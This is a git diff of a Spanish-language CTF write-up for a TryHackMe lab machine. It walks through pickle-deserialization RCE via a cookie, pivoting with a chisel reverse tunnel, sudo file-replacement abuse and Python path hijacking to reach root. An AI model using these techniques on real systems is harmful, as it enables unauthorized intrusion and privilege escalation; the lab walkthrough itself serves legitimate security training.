@@ -17,6 +17,7 @@ tags:
   - Pickle
   - Bash
   - RCE
+  - Path Hijacking
 ---
 
 <p align="center">
@@ -30,9 +31,9 @@ La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma 
   Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.189.24]** utilizando los parámetros:
 
   - **-p-:**    Escaneo a toda la gama de puertos (65536).
-  - **-Pn:**     .
-  - **--min-rate 5000:** .
-  - **-sS:**
+  - **-Pn:**    Evita hacer ping a las maquinas a escanear.
+  - **--min-rate:** Envió de paquetes no mas lentos que el numero especificando.
+  - **-sS:**    Lanza un sondeo de tipo SYN sigiloso
   - **--open:** Muestra sólo los puertos con un estatus abierto.
   - **-oG:**    Guarda la el output en formato Grepeable.
 
@@ -79,7 +80,7 @@ La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma 
   <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/cookie.png?raw=true">
   </p>
 
-  Buscando como aprovecharnos sobre esto encontre el siguiente **(articulo)[https://davidhamann.de/2020/04/05/exploiting-python-pickle/]** que habla como usar python para serializar la data con pickle y enviarla mediante curl la data que serializamos.
+  Buscando como aprovecharnos sobre esto encontré el siguiente **(articulo)[https://davidhamann.de/2020/04/05/exploiting-python-pickle/]** que habla como usar python para serializar la data con pickle y enviarla mediante curl la data que serializamos.
 
   El codigo que podemos usar es el siguiente:
 
@@ -101,7 +102,7 @@ La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma 
   print base64.b64encode(cPickle.dumps(PickleRce()))
   ```
 
-  Este codigo ya es suficiente para poder conseguir un **RCE** en la maquina victima, esto se haria usando curl y seria de la siguiente forma.
+  Este código ya es suficiente para poder conseguir un **RCE** en la maquina victima, esto se haría usando curl y seria de la siguiente forma.
 
   ```bash
 curl -X GET "http://[Ip Machine]:5003/search" -H 'Cookie: search_cookie="[Data Serializada]"'
@@ -119,6 +120,10 @@ curl -X GET "http://[Ip Machine]:5003/search" -H 'Cookie: search_cookie="[Data S
 
   Enumerando el sistema podemos ver que estamos en un contenedor el cual tiene la ip **[172.17.0.2]** y también se puede ver que el **bash_history** no fue borrado y podemos ver los comando que se ejecutaron en la maquina, en lo que se ve es que existe un segmento de red el cual tiene la ip **[172.17.0.1]** y tiene al parecer el puerto 22 abierto para comprobar esto me cree un script en **bash** para encontrar diferentes host y sus puertos abiertos.
 
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/ssh.png?raw=true">
+  </p>
+
   ```bash
 #!/bin/bash
 
@@ -133,7 +138,7 @@ done; wait
   <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/script.png?raw=true">
   </p>
 
-  Como vemos efectivamente tiene el puerto **22** abierto la otra maquina que esta en el otro segmeto de red asi que lo que haremos sera un **pivoting** para saltar a la otra maquina para eso usaremos la herramienta **[chisel](https://github.com/jpillora/chisel)** para hacer un **Port Forwarding**.
+  Como vemos efectivamente tiene el puerto **22** abierto la otra maquina que esta en el otro segmento de red así que lo que haremos sera un **pivoting** para saltar a la otra maquina para eso usaremos la herramienta **[chisel](https://github.com/jpillora/chisel)** para hacer un **Port Forwarding**.
 
   Para esto tienes que compilar el binario de **chisel** puede ser con la primer opción que es una compilación normal ó la segunda que es para reducir su peso sin afectar su funcionamiento:
 
@@ -143,12 +148,12 @@ done; wait
   - go build -ldflags "-s  -w" .
   - upx burte chisel
 
-  La forma en que yo me comparti el binario a la maquina victima fue mediante el uso de un simple server con **python** usando el comando:
+  La forma en que yo me compartí el binario a la maquina victima fue mediante el uso de un simple server con **python** usando el comando:
   ```bash
   python3 -m http.simple 80
   ```
-  Y desde la maquina victima usando **wget** aprovehcando que en el **bash_history** se ve que esta disponibles en la maquina.
-  El usdo de chisel es simple, en nustra maquina de atacante tenemos que ejecutarlo de la siguiente forma:
+  Y desde la maquina victima usando **wget** aprovechando que en el **bash_history** se ve que esta disponibles en la maquina.
+  El uso de chisel es simple, en nuestra maquina de atacante tenemos que ejecutarlo de la siguiente forma:
   ```bash
   ./chisel server --reverse -p 9090
   ```
@@ -168,3 +173,70 @@ done; wait
   <p align="center">
   <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/portf.png?raw=true">
   </p>
+
+  Como vimos que en **bash_history** estaba entrado por **ssh** con el usuario **ramsey** nosotros también entraremos con ese usuario pero como no conocemos la contraseña haré un pequeño script en python para hacer fuerza bruta a el servicio **ssh**.
+
+  ```python
+  [!] Pendiente
+  ```
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/script2.png?raw=true">
+  </p>
+
+  Ya que tenemos las credenciales del usuario **ramsey** entramos por ssh y empezamos a enumerar el sistema, vemos que a nivel de sudo puede ejecutar **"/home/ramsey/vuln.py"** sin proporcionar contraseña como el usuario **oliver**.
+
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/sudo.png?raw=true">
+  </p>
+
+  Ya que el archivo .py esta en nuestro directorio nosotros podemos eliminar este archivo aunque no seamos el propietario, haciendo esto podemos crear otro archivo con el mismo nombre y el siguiente contenido:
+
+  ```python
+import os
+
+  os.system("/bin/bash")
+  ```
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/oshell.png?raw=true">
+  </p>
+
+  Ahora como el usuario **oliver** viendo los permisos que tiene como a nivel de sudo, se puede ver que puede ejecutar como el usuario **root** el archivo **/opt/dockerScript.py**
+
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/sudo2.png?raw=true">
+  </p>
+
+  El archivo **dockerScript.py** importa la librería **docker** una forma de poder escalar privilegios aqui es haciendo un **path hijacking**, python por defecto busca los archivos importados primero en el directorio actual y luego los que estan especificados en el **path** para ver esto podemos usar la siguiente sentencia en python.
+
+  ```python
+  python -c 'import sys; print sys.path'
+  ```
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/path.png?raw=true">
+  </p>
+
+  Las comillas simples **' '** en el **path** indican que python primero busca en la ruta actual y si no encuentra el recuso buscá en los siguientes directorios que tiene definido, si lo encuentra en la ruta actual se queda con ese archivo sin importar que en los siguientes haya otro, su orden de prioridad es de izquierda a derecha.
+
+  Sabiendo esto nos podemos ir a la ruta **/tmp** y crear nuestro archivo con código malicioso para poder escalar privilegios. El contenido del archivo seria exentamente el mismo que el pasado ya que lo que hacemos es importar una bash como el usuario que está ejecutando el archivo python que en este caso con el permiso sudo es **root**.
+
+  ```python
+import os
+
+  os.system("/bin/bash")
+  ```
+
+  Ya que tenemos el archivo creardo ejecutamos la siguiente sentencia de codigo:
+
+  ```bash
+  sudo -u root PYTHONPATH=/tmp /usr/bin/python /opt/dockerScript.py
+  ```
+
+  - **-u** es para especificar el usuario a usar ***(En este caso root)***.
+  - **PYTHONPATH** Este parámetro es para especificar por que ruta debe buscar prioritariamente.
+
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/rshell.png?raw=true">
+  </p>
+
+
+  Como vemos al ejecutar esa sentencia de comandos nos otorgan la shell como **root** y así pudiendo visualizar la flag de root y finalizar la maquina.
